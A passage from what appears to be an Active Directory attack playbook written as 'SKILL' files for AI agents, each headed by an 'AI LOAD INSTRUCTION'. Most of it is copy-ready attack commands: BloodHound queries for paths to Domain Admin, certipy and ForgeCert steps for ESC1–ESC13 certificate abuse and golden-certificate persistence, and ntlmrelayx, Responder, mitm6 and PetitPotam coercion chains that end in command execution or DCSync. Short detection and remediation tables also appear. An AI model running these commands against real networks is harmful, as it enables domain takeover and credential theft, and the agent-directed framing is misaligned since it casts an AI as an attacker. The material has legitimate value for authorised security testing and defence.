              └── Task runs on DCs → SYSTEM on DC
```

### Pattern 5: LAPS + Local Admin → Session Hijack

```
lowpriv_user
  └── ReadLAPSPassword on TARGET_SERVER
        └── Local admin on TARGET_SERVER
              └── Domain Admin session on TARGET_SERVER
                    └── Credential dump → DA hash
```

---

## 4. CUSTOM BLOODHOUND QUERIES FOR SPECIFIC SCENARIOS

### Find Users with Passwords in Description

```cypher
MATCH (u:User)
WHERE u.description =~ '(?i).*(pass|pwd|cred|secret).*'
RETURN u.name, u.description
```

### Find All ACL Paths Between Two Nodes

```cypher
MATCH p=allShortestPaths((a)-[r*1..7]->(b))
WHERE a.name = "LOWPRIV@DOMAIN.COM"
AND b.name = "DOMAIN ADMINS@DOMAIN.COM"
AND ALL(rel IN relationships(p) WHERE type(rel) IN
  ["GenericAll","GenericWrite","WriteDacl","WriteOwner","ForceChangePassword",
   "AddMember","MemberOf","AdminTo","HasSession","CanRDP","CanPSRemote"])
RETURN p
```

### High-Value Target Identification

```cypher
MATCH (n)
WHERE n.highvalue = true
RETURN labels(n)[0] AS type, n.name AS target
ORDER BY type
```

### Find Kerberoastable Service Accounts with Admin Rights

```cypher
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer)
RETURN u.name AS service_account, collect(c.name) AS admin_on
```

### Computers Trusting Machine Accounts for Delegation

```cypher
MATCH (c1:Computer)-[:AllowedToDelegate]->(c2:Computer)
RETURN c1.name AS delegator, c2.name AS target
```

---

## 5. BLOODHOUND CE (COMMUNITY EDITION) TIPS

### API Queries (BloodHound CE)

```bash
# List available attack paths via API
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://bloodhound.local/api/v2/attack-paths" | jq

# Get path findings for a specific domain
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://bloodhound.local/api/v2/domains/$DOMAIN_ID/attack-path-findings" | jq
```

### Mark Nodes as Owned

```cypher
# Mark compromised user
MATCH (u:User {name:"COMPROMISED@DOMAIN.COM"})
SET u.owned = true
RETURN u.name
```

### Mark High-Value Targets

```cypher
# Mark custom high-value targets
MATCH (c:Computer {name:"SQLSERVER01.DOMAIN.COM"})
SET c.highvalue = true
RETURN c.name
```

---

## 6. ATTACK PATH DECISION FLOW

```
BloodHound data collected and imported
│
├── Mark owned principals (compromised users/computers)
│
├── Run "Shortest Paths from Owned to DA"
│   ├── Direct path found? → follow the chain
│   │   ├── ACL edge → exploit per SKILL.md §3
│   │   ├── Session edge → credential dump on that host
│   │   └── AdminTo edge → lateral movement to host
│   └── No path found?
│       ├── Run custom queries (§4) for non-obvious paths
│       ├── Check for Kerberoastable → high-value paths (§2.3)
│       └── Look for LAPS readers → local admin chains (§2.10)
│
├── No path to DA at all?
│   ├── Check for paths to other high-value targets
│   ├── Expand attack surface: compromise more users/hosts
│   ├── Re-collect session data (sessions change over time)
│   └── Look for cross-domain trust paths
│
└── Multiple paths available?
    ├── Prefer: ForceChangePassword (cleanest)
    ├── Then: Shadow Credentials (reversible)
    ├── Then: Targeted Kerberoast (if crackable)
    └── Avoid: Adding to Domain Admins (noisy)
```


---
# Part 5: AD Certificate Services


# SKILL: AD CS Attack Playbook — Expert Guide

> **AI LOAD INSTRUCTION**: Expert AD CS (Active Directory Certificate Services) attack techniques. Covers ESC1 through ESC13, certificate-based persistence, NTLM relay to enrollment endpoints, and CA misconfigurations. Base models miss enrollment prerequisite chains and ESC condition combinations.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based attacks that enable ESC4 (template modification)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos techniques after obtaining certificates
- [ntlm-relay-coercion](../ntlm-relay-coercion/SKILL.md) for ESC8 (relay to HTTP enrollment endpoint)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for using obtained certificates for lateral movement

### Advanced Reference

Also load [ADCS_ESC_MATRIX.md](./ADCS_ESC_MATRIX.md) when you need:
- ESC1–ESC13 quick reference table with conditions, impact, and tool commands
- One-liner exploitation commands per ESC variant
- Detection indicators per technique


## 1. AD CS ARCHITECTURE OVERVIEW

```
Certificate Authority (CA)
│
├── Enterprise CA (AD-integrated, issues certs based on templates)
│   ├── Certificate Templates (define who can enroll, what EKUs, subject settings)
│   ├── Enrollment endpoints: HTTP (certsrv), RPC, DCOM
│   └── Published in AD: CN=Public Key Services,CN=Services,CN=Configuration
│
├── Template Key Settings:
│   ├── Subject Alternative Name (SAN): who the cert represents
│   ├── Extended Key Usage (EKU): what the cert allows
│   ├── Enrollment permissions: who can request
│   └── Issuance requirements: manager approval, authorized signatures
│
└── Certificate → Kerberos Auth Flow:
    User presents cert → PKINIT → KDC verifies → issues TGT
```

---

## 2. ENUMERATION

```bash
# Certipy (recommended — comprehensive)
certipy find -u user@domain.com -p password -dc-ip DC_IP -stdout
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable -stdout

# Certify (from Windows)
Certify.exe find
Certify.exe find /vulnerable
Certify.exe cas                    # Enumerate CAs

# Manual LDAP query for templates
ldapsearch -H ldap://DC_IP -D "user@domain.com" -w password \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" \
  "(objectClass=pKICertificateTemplate)" cn msPKI-Certificate-Name-Flag pKIExtendedKeyUsage
```

---

## 3. ESC1 — ENROLLEE SUPPLIES SUBJECT

**Condition**: Template allows enrollee to specify Subject Alternative Name (SAN) + client authentication EKU + low-privilege enrollment.

```bash
# Certipy
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Certify (Windows)
Certify.exe request /ca:CA-NAME /template:VulnTemplate /altname:administrator

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# → NT hash of administrator
```

---

## 4. ESC2 — ANY PURPOSE EKU

**Condition**: Template has "Any Purpose" EKU or no EKU (subordinate CA cert) + low-privilege enrollment.

```bash
# Same as ESC1 exploitation
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template AnyPurposeTemplate -upn administrator@domain.com
```

---

## 5. ESC3 — ENROLLMENT AGENT

**Condition**: Template allows enrollment agent certificate + another template allows enrollment on behalf of others.

```bash
# Step 1: Request enrollment agent cert
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template EnrollmentAgent

# Step 2: Use enrollment agent cert to request on behalf of admin
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template UserTemplate -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## 6. ESC4 — TEMPLATE ACL MISCONFIGURATION

**Condition**: Low-privilege user has write access to certificate template object.

```bash
# Modify template to become ESC1 vulnerable
# Using Certipy:
certipy template -u user@domain.com -p password -template VulnTemplate \
  -save-old -dc-ip DC_IP

# Template is now ESC1 → exploit as ESC1
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template VulnTemplate -upn administrator@domain.com

# Restore original template (cleanup)
certipy template -u user@domain.com -p password -template VulnTemplate \
  -configuration old_config.json -dc-ip DC_IP
```

---

## 7. ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition**: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled → any template becomes ESC1.

```bash
# Check if flag is set
certutil -config "CA_HOST\CA-NAME" -getreg policy\EditFlags

# Exploit: request any template with SAN
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template User -upn administrator@domain.com
```

---

## 8. ESC7 — CA OFFICER / MANAGER PERMISSIONS

**Condition**: User has ManageCA or ManageCertificates permission on the CA.

```bash
# With ManageCA: enable SubCA template (always allows SAN)
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -enable-template SubCA

# Request SubCA cert with admin SAN (will be denied — "pending")
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -template SubCA -upn administrator@domain.com

# With ManageCertificates: approve the pending request
certipy ca -u user@domain.com -p password -ca CA-NAME -dc-ip DC_IP \
  -issue-request REQUEST_ID

# Retrieve the issued certificate
certipy req -u user@domain.com -p password -ca CA-NAME -target CA_HOST \
  -retrieve REQUEST_ID
```

---

## 9. ESC8 — NTLM RELAY TO HTTP ENROLLMENT

**Condition**: CA has HTTP enrollment endpoint (certsrv) without HTTPS enforcement.

```bash
# Setup relay to enrollment endpoint
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication (PetitPotam, PrinterBug, etc.)
PetitPotam.py RELAY_HOST DC01.domain.com

# DC authenticates → relay → certificate issued for DC01$
# Authenticate with certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → DC01$ hash → DCSync
```

---

## 10. ESC9-ESC13 — NEWER DISCOVERIES

### ESC9: No Security Extension (StrongCertificateBindingEnforcement = 0/1)

Weak certificate mapping allows impersonation when `CT_FLAG_NO_SECURITY_EXTENSION` is set.

```bash
# Change victim's UPN to admin, request cert, change back
certipy shadow auto -u attacker@domain.com -p pass -account victim -dc-ip DC_IP
```

### ESC10: Weak Certificate Mapping (Registry-based)

Similar to ESC9 but exploits `CertificateMappingMethods` registry value on DC.

### ESC11: NTLM Relay to RPC Enrollment

Relay NTLM to the CA's RPC interface (IF_ENFORCEENCRYPTICERTREQUEST not set).

```bash
ntlmrelayx.py -t "rpc://CA_HOST" -rpc-mode ICPR -icpr-ca-name "CA-NAME" \
  -smb2support --adcs --template DomainController
```

### ESC13: OID Group Link (Issuance Policy)

Template's issuance policy OID is linked to a group → certificate grants that group membership.

```bash
certipy req -u user@domain.com -p pass -ca CA-NAME -target CA_HOST \
  -template ESC13Template
# Certificate grants membership in linked group
```

---

## 11. CERTIFICATE-BASED PERSISTENCE

### Golden Certificate

With CA private key → forge any certificate.

```bash
# Extract CA private key (requires admin on CA server)
certipy ca -backup -u admin@domain.com -p password -ca CA-NAME -target CA_HOST

# Forge certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.com -subject "CN=Administrator,CN=Users,DC=domain,DC=com"

# Authenticate with forged cert
certipy auth -pfx forged.pfx -dc-ip DC_IP
```

**Persistence**: Valid until CA certificate expires or CA private key is rotated.

### ForgeCert (Windows)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "pass" --Subject "CN=User" \
  --SubjectAltName "administrator@domain.com" --NewCertPath forged.pfx --NewCertPassword "pass"
```

---

## 12. AD CS ATTACK DECISION TREE

```
Targeting AD CS
│
├── Enumerate: certipy find -vulnerable
│
├── Vulnerable template found?
│   ├── Enrollee can set SAN + Client Auth EKU?
│   │   └── ESC1 → request cert with admin UPN (§3)
│   ├── Any Purpose EKU?
│   │   └── ESC2 → same as ESC1 (§4)
│   ├── Enrollment Agent template available?
│   │   └── ESC3 → enroll as agent, then on-behalf-of (§5)
│   └── OID group link in issuance policy?
│       └── ESC13 → request cert for group membership (§10)
│
├── Write access to template?
│   └── ESC4 → modify template to ESC1 condition (§6)
│
├── CA misconfiguration?
│   ├── EDITF_ATTRIBUTESUBJECTALTNAME2 flag?
│   │   └── ESC6 → any template becomes ESC1 (§7)
│   ├── ManageCA / ManageCertificates permission?
│   │   └── ESC7 → enable SubCA template, approve requests (§8)
│   └── HTTP enrollment without HTTPS?
│       └── ESC8 → NTLM relay to certsrv (§9)
│
├── Weak certificate mapping on DC?
│   ├── StrongCertificateBindingEnforcement < 2?
│   │   └── ESC9 → UPN manipulation + cert request (§10)
│   └── CertificateMappingMethods misconfigured?
│       └── ESC10 → similar UPN abuse (§10)
│
├── RPC enrollment without encryption?
│   └── ESC11 → NTLM relay to RPC (§10)
│
└── Already CA admin?
    └── Golden certificate for persistence (§11)
```


---
# Part 6: ADCS ESC Matrix


## 1. ESC VULNERABILITY MATRIX

| ESC | Name | Condition | Impact | Difficulty |
|---|---|---|---|---|
| **ESC1** | Enrollee Supplies SAN | Template: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment | **Domain Admin** | Easy |
| **ESC2** | Any Purpose EKU | Template: Any Purpose (2.5.29.37.0) or no EKU + low-priv enrollment | **Domain Admin** | Easy |
| **ESC3** | Enrollment Agent | Enrollment agent template + second template allowing on-behalf-of | **Domain Admin** | Medium |
| **ESC4** | Template ACL | Write access to template object in AD | **Domain Admin** | Medium |
| **ESC5** | CA Object ACL | Write access to CA object or PKI-related containers | **CA Compromise** | Medium |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows SAN in any request | **Domain Admin** | Easy |
| **ESC7** | CA Officer Abuse | ManageCA or ManageCertificates on CA | **Domain Admin** | Medium |
| **ESC8** | NTLM Relay to HTTP | HTTP enrollment endpoint without HTTPS/EPA | **Domain Admin** | Medium |
| **ESC9** | No Security Extension | StrongCertificateBindingEnforcement ≠ 2, CT_FLAG_NO_SECURITY_EXTENSION | **Impersonation** | Hard |
| **ESC10** | Weak Cert Mapping | CertificateMappingMethods includes UPN/implicit mapping | **Impersonation** | Hard |
| **ESC11** | NTLM Relay to RPC | CA RPC enrollment without encryption enforcement | **Domain Admin** | Medium |
| **ESC12** | CA on YubiHSM | Shell access to CA + YubiHSM key accessible | **Golden Cert** | Hard |
| **ESC13** | OID Group Link | Issuance policy OID linked to AD group + enrollable template | **Group Membership** | Medium |


## 2. ONE-LINER EXPLOITATION COMMANDS

### ESC1

```bash
# Enumerate
certipy find -u user@domain.com -p pass -dc-ip DC -vulnerable -stdout | grep -A 20 "ESC1"

# Exploit
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template VulnTemplate -upn administrator@domain.com

# Auth
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC2

```bash
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template AnyPurpose -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC3

```bash
# Step 1: Get enrollment agent cert
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template EnrollmentAgentTemplate

# Step 2: Request on behalf of admin
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template User -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC4

```bash
# Modify template → ESC1
certipy template -u user@domain.com -p pass -template VulnTemplate -save-old -dc-ip DC

# Exploit as ESC1
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template VulnTemplate -upn administrator@domain.com

# Cleanup
certipy template -u user@domain.com -p pass -template VulnTemplate \
  -configuration VulnTemplate.json -dc-ip DC
```

### ESC6

```bash
# Verify flag
certutil -config "ca.domain.com\CORP-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2

certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template User -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC7

```bash
# Enable SubCA template (ManageCA)
certipy ca -u user@domain.com -p pass -ca CORP-CA -dc-ip DC -enable-template SubCA

# Request (gets denied to pending)
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template SubCA -upn administrator@domain.com
# Note the request ID

# Approve (ManageCertificates)
certipy ca -u user@domain.com -p pass -ca CORP-CA -dc-ip DC -issue-request ID

# Retrieve
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com -retrieve ID
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC8

```bash
# Setup relay
ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Coerce DC
PetitPotam.py RELAY_HOST DC01.domain.com
# Or: printerbug.py DOMAIN/user:pass@DC01 RELAY_HOST

# Auth with captured cert
certipy auth -pfx dc01.pfx -dc-ip DC
# DCSync with DC machine account
secretsdump.py -hashes :DC01_HASH DOMAIN/DC01\$@DC -just-dc
```

### ESC11

```bash
ntlmrelayx.py -t "rpc://ca.domain.com" -rpc-mode ICPR -icpr-ca-name "CORP-CA" \
  -smb2support --adcs --template DomainController

# Coerce + capture same as ESC8
```

### ESC13

```bash
# Enumerate OID group links
certipy find -u user@domain.com -p pass -dc-ip DC -vulnerable -stdout | grep -A 10 "ESC13"

certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template ESC13Template
certipy auth -pfx user.pfx -dc-ip DC
# Verify group membership added
```

---

## 3. DETECTION INDICATORS

| ESC | Detection Method |
|---|---|
| ESC1/2 | Event 4887: certificate request with SAN different from requester |
| ESC3 | Event 4887: enrollment agent request + subsequent on-behalf-of |
| ESC4 | Event 5136: directory service object modification on template |
| ESC6 | Audit `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA |
| ESC7 | Event 4870/4882: CA configuration change |
| ESC8 | Network: NTLM authentication to HTTP enrollment endpoint |
| ESC9/10 | Event 4768: PKINIT auth with certificate mapping mismatch |
| ESC11 | Network: NTLM authentication to CA RPC interface |
| ESC13 | Event 4887: enrollment in template with OID group link |

---

## 4. TOOL COMPARISON

| Feature | Certipy (Python) | Certify (C#) | ForgeCert (C#) |
|---|---|---|---|
| **Platform** | Linux/Windows | Windows | Windows |
| **Enumerate** | Yes (`find`) | Yes (`find`) | No |
| **ESC1-4** | Yes | Yes | No |
| **ESC5-8** | Yes | Partial | No |
| **ESC9-13** | Yes (latest) | No | No |
| **Template modify** | Yes | No | No |
| **CA backup** | Yes | No | No |
| **Forge certs** | Yes (`forge`) | No | Yes |
| **Auth (PKINIT)** | Yes (`auth`) | No | No |
| **Relay integration** | Via ntlmrelayx | N/A | N/A |

---

## 5. REMEDIATION QUICK REFERENCE

| ESC | Fix |
|---|---|
| ESC1 | Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` or restrict enrollment |
| ESC2 | Remove "Any Purpose" EKU, set specific EKU |
| ESC3 | Restrict enrollment agent template to specific users |
| ESC4 | Audit and restrict write ACLs on certificate templates |
| ESC6 | Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` flag: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` |
| ESC7 | Restrict ManageCA/ManageCertificates to necessary admins |
| ESC8 | Enforce HTTPS + EPA on enrollment endpoints; disable HTTP |
| ESC9/10 | Set `StrongCertificateBindingEnforcement = 2` on all DCs |
| ESC11 | Set `IF_ENFORCEENCRYPTICERTREQUEST` on CA RPC interface |
| ESC13 | Audit OID group links in issuance policies |


---
# Part 7: NTLM Relay & Coercion


# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert NTLM relay and coercion techniques. Covers relay to SMB/LDAP/HTTP/MSSQL, signing requirements, Responder poisoning, mitm6, cross-protocol relay, WebDAV coercion, and all major coercion methods. Base models miss signing/EPA requirements and cross-protocol relay constraints.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [active-directory-certificate-services](../active-directory-certificate-services/SKILL.md) for ESC8 (relay to ADCS enrollment)
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL modification via LDAP relay (RBCD, shadow creds)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos attacks after relay success
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) for post-relay lateral movement

### Advanced Reference

Also load [COERCION_METHODS.md](./COERCION_METHODS.md) when you need:
- Detailed coercion method comparison (PetitPotam, PrinterBug, DFSCoerce, etc.)
- RPC function-level details and prerequisites
- Coercer tool usage and discovery


## 1. NTLM RELAY FUNDAMENTALS

```
Victim          Attacker (relay)         Target
  │                 │                      │
  │── NTLM Auth ──→│                      │  (1) Victim authenticates (coerced/poisoned)
  │                 │── Forward Auth ─────→│  (2) Attacker relays to target
  │                 │←─ Challenge ──────── │  (3) Target sends challenge
  │←─ Challenge ────│                      │  (4) Attacker forwards challenge to victim
  │── Response ────→│                      │  (5) Victim computes response
  │                 │── Forward Response ─→│  (6) Attacker relays response to target
  │                 │←─ Authenticated! ────│  (7) Target accepts → attacker has session
```

### NTLMv1 vs NTLMv2

| Feature | NTLMv1 | NTLMv2 |
|---|---|---|
| Security | Weak (crackable to NTLM hash) | Stronger (but still relayable) |
| Relay | Yes | Yes |
| Crack to hash | Yes (rainbow tables, crack.sh) | Offline brute-force only |
| Downgrade | Force via Responder `--lm` | Default in modern Windows |

---

## 2. RELAY TARGET MATRIX

| Target Protocol | What You Get | Signing Required by Default? | EPA/Channel Binding? |
|---|---|---|---|
| **SMB** | Command exec (if admin), file access | **DCs: Yes**, Workstations: No | No |
| **LDAP** | ACL modification, RBCD, shadow creds, add computer | **DCs: No** (negotiated) | No (unless configured) |
| **LDAPS** | Same as LDAP but encrypted | N/A | **Yes** (channel binding) |
| **HTTP (ADCS)** | Certificate enrollment (ESC8) | No | Depends on config |
| **MSSQL** | SQL queries, xp_cmdshell | No | No |
| **IMAP/SMTP** | Email access | No | No |
| **RPC** | Various (CA enrollment for ESC11) | Depends | No |

### Signing Check

```bash
# Check SMB signing on target
crackmapexec smb TARGET_IP --gen-relay-list relay_targets.txt
# Outputs hosts WITHOUT required SMB signing

# Nmap SMB signing check
nmap -p 445 --script smb2-security-mode TARGET_RANGE
```

---

## 3. RESPONDER — CREDENTIAL CAPTURE

### LLMNR/NBT-NS/WPAD/mDNS Poisoning

```bash
# Start Responder (capture mode — don't relay, just capture hashes)
responder -I eth0 -dwP

# Analyze mode (passive, no poisoning)
responder -I eth0 -A

# Key protocols poisoned:
# LLMNR (UDP 5355) — Link-Local Multicast Name Resolution
# NBT-NS (UDP 137)  — NetBIOS Name Service
# WPAD              — Web Proxy Auto-Discovery (proxy config)
# mDNS (UDP 5353)   — Multicast DNS
```

### Responder + Relay (Don't Capture, Relay Instead)

```bash
# Disable HTTP and SMB servers in Responder (ntlmrelayx will handle them)
# Edit /etc/responder/Responder.conf: set HTTP and SMB to Off

# Start Responder for poisoning only
responder -I eth0 -dwP

# Start ntlmrelayx for relay
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 4. NTLMRELAYX — RELAY EXECUTION

### Relay to SMB (Admin Execution)

```bash
# Execute command on targets (requires admin privs on target)
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive SOCKS proxy (maintain sessions)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then: proxychains smbclient //TARGET/C$ -U DOMAIN/user
```

### Relay to LDAP (ACL Modification)

```bash
# Automatic RBCD (delegate-access)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Escalate via shadow credentials
ntlmrelayx.py -t ldap://DC_IP --shadow-credentials -smb2support

# Add computer account
ntlmrelayx.py -t ldap://DC_IP --add-computer FAKE01 P@ss123 -smb2support

# Dump domain info
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-domain
```

### Relay to ADCS HTTP (ESC8)

```bash
ntlmrelayx.py -t http://CA_HOST/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Use with coercion to relay DC auth → get DC certificate
```

### Relay to MSSQL

```bash
ntlmrelayx.py -t mssql://SQL_HOST -smb2support -q "SELECT system_user; EXEC xp_cmdshell 'whoami'"
```

---

## 5. MITM6 — IPv6 DNS TAKEOVER

```bash
# mitm6 exploits IPv6 auto-configuration to become DNS server
mitm6 -d domain.com

# Combined with ntlmrelayx
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support

# Flow:
# 1. mitm6 sends DHCPv6 replies → victim gets attacker as IPv6 DNS
# 2. Victim queries WPAD → attacker responds
# 3. NTLM auth triggered → relayed to LDAP
# 4. RBCD or shadow credentials set on victim computer
```

---

## 6. CROSS-PROTOCOL RELAY

### SMB → LDAP

Capture SMB authentication, relay to LDAP (requires no LDAP signing enforcement).

```bash
# Coerce SMB auth from DC, relay to LDAP on same or different DC
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Trigger coercion (attacker receives SMB auth)
PetitPotam.py ATTACKER_IP DC01_IP
```

**Limitation**: SMB → LDAP relay fails if the source uses SMB signing negotiation that indicates relay.

### WebDAV → LDAP

WebDAV from workstations sends NTLM over HTTP → relay to LDAP (no signing issues).

```bash
# WebDAV coercion sends HTTP-based NTLM (no SMB signing concern)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Coerce via WebDAV (workstation must have WebClient service running)
# Use @ATTACKER_PORT format to force WebDAV
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. WEBDAV-BASED COERCION

WebClient service (WebDAV) converts SMB-type coercion to HTTP-based NTLM.

```bash
# Check if WebClient is running (port 80 listener or service query)
crackmapexec smb TARGET -u user -p pass -M webdav

# Start WebDAV coercion (from workstation, not server)
# Force target to authenticate via HTTP:
# Use UNC path format: \\ATTACKER@PORT\share
```

**Key advantage**: HTTP-based NTLM avoids SMB signing requirements.

---

## 8. NTLM RELAY DECISION TREE

```
Want to relay NTLM authentication
│
├── What auth can you capture?
│   ├── Responder poisoning (passive, wait for queries)
│   ├── mitm6 (DHCPv6 DNS takeover, periodic)
│   └── Active coercion → load COERCION_METHODS.md
│
├── What target to relay to?
│   │
│   ├── Need code execution?
│   │   ├── SMB target without signing → ntlmrelayx to SMB (§4)
│   │   └── MSSQL target → ntlmrelayx to MSSQL + xp_cmdshell (§4)
│   │
│   ├── Need domain escalation?
│   │   ├── LDAP signing not enforced?
│   │   │   ├── Relay to LDAP → RBCD (§4)
│   │   │   ├── Relay to LDAP → shadow credentials (§4)
│   │   │   └── Relay to LDAP → add computer + delegate (§4)
│   │   └── LDAP signing enforced?
│   │       └── Relay to ADCS HTTP (ESC8) → certificate (§4)
│   │
│   └── Need certificate?
│       └── Relay to ADCS HTTP/RPC → ESC8/ESC11 (§4)
│
├── Source is SMB-based?
│   ├── Target is SMB → check signing (§2)
│   ├── Target is LDAP → may work (cross-protocol, §6)
│   └── Target is HTTP → works (cross-protocol)
│
├── Source is HTTP-based (WebDAV)?
│   └── Relay to any target (no signing issues, §6/§7)
│
└── Relay fails?
    ├── Check signing requirements (§2)
    ├── Check EPA/channel binding
    ├── Try cross-protocol (SMB → LDAP)
    └── Try WebDAV coercion (avoids SMB signing)
```


---
# Part 8: Coercion Methods


## 1. COERCION METHODS MATRIX

| Method | RPC Interface | Function | Protocol | Auth Type | Requires Creds? | Target |
|---|---|---|---|---|---|---|
| **PetitPotam** | MS-EFSR (lsarpc) | EfsRpcOpenFileRaw + variants | SMB (445) | Machine account | No (unauthenticated on unpatched) | DC/Any |
| **PrinterBug** | MS-RPRN (spoolss) | RpcRemoteFindFirstPrinterChangeNotificationEx | SMB (445) | Machine account | Yes (domain user) | Any with Spooler |
| **DFSCoerce** | MS-DFSNM (netdfs) | NetrDfsRemoveStdRoot / NetrDfsAddStdRoot | SMB (445) | Machine account | Yes (domain user) | DC |
| **ShadowCoerce** | MS-FSRVP (fssagent) | IsPathShadowCopied / IsPathSupported | SMB (445) | Machine account | Yes (domain user) | File servers |
| **MSEven** | MS-EVEN (eventlog) | ElfrOpenBELW | SMB (445) | Machine account | Yes (domain user) | Any |
| **CheeseOunce** | MS-EVEN | OpenEventLogW (via named pipe) | SMB (445) | Machine account | Yes | Any |


## 2. PETITPOTAM — MS-EFSR ABUSE

### Unauthenticated (Pre-Patch / Misconfigured)

```bash
# Original PetitPotam — unauthenticated
PetitPotam.py LISTENER_IP TARGET_IP

# Specific EFS functions:
PetitPotam.py -method EfsRpcOpenFileRaw LISTENER_IP TARGET_IP
PetitPotam.py -method EfsRpcEncryptFileSrv LISTENER_IP TARGET_IP
```

### Authenticated

```bash
# With credentials (required on patched systems)
PetitPotam.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

### EFS RPC Function Variants

| Function | Patched? | Notes |
|---|---|---|
| `EfsRpcOpenFileRaw` | Patched (Nov 2021) | Original PetitPotam function |
| `EfsRpcEncryptFileSrv` | Patched later | Alternative function |
| `EfsRpcDecryptFileSrv` | Partially patched | May still work |
| `EfsRpcQueryUsersOnFile` | Partially patched | May still work |
| `EfsRpcQueryRecoveryAgents` | Partially patched | May still work |
| `EfsRpcFileKeyInfo` | Varies | Check per target |

---

## 3. PRINTERBUG — MS-RPRN (SPOOLSAMPLE)

### Prerequisites
- Print Spooler service running on target
- Valid domain credentials

```bash
# SpoolSample (Windows)
SpoolSample.exe TARGET_HOST LISTENER_HOST

# printerbug.py (Impacket)
printerbug.py DOMAIN/user:password@TARGET_IP LISTENER_IP

# Dementor (Python)
python3 dementor.py -d domain.com -u user -p password LISTENER_IP TARGET_IP
```

### Check If Spooler Is Running

```bash
# From Linux
rpcdump.py DOMAIN/user:pass@TARGET_IP | grep -i spoolss

# CrackMapExec
crackmapexec smb TARGET_IP -u user -p pass -M spooler
```

---

## 4. DFSCOERCE — MS-DFSNM

```bash
# DFSCoerce
python3 dfscoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP

# Specific functions
python3 dfscoerce.py -u user -p password -d domain.com \
  -method NetrDfsRemoveStdRoot LISTENER_IP TARGET_IP
```

### MS-DFSNM Functions

| Function | Notes |
|---|---|
| `NetrDfsRemoveStdRoot` | Primary coercion function |
| `NetrDfsAddStdRoot` | Alternative |

---

## 5. SHADOWCOERCE — MS-FSRVP

Exploits the File Server VSS Agent Service (requires the service to be running — common on file servers).

```bash
# ShadowCoerce
python3 shadowcoerce.py -u user -p password -d domain.com LISTENER_IP TARGET_IP
```

### MS-FSRVP Functions

